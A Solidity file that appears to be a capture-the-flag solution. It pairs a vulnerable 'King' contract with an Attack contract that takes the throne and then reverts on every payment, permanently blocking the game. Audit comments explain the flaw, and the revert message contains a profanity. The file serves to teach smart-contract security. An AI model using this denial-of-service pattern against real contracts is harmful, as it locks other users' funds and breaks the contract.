// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    // @Audit - receive() function will be called when the contract receives ether.
    // if transfer ether to th new king and they don't accept it, this contract will break
    // cause king already = new king, but the new king didn't receive the ether.
    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attack {
    // @Audit - the constructor function will call the king contract and send ether to it.
    constructor(address payable _kingContractAddress) payable {
        (bool s,) = _kingContractAddress.call{value: msg.value}("");
        require(s, "External call failed");
    }

    // @Audit - the fallback function will stop the king contract from receiving ether.
    // in order to break the king contract.
    receive() external payable {
        require(false, "cannot claim my throne! Bitch");
    }
}
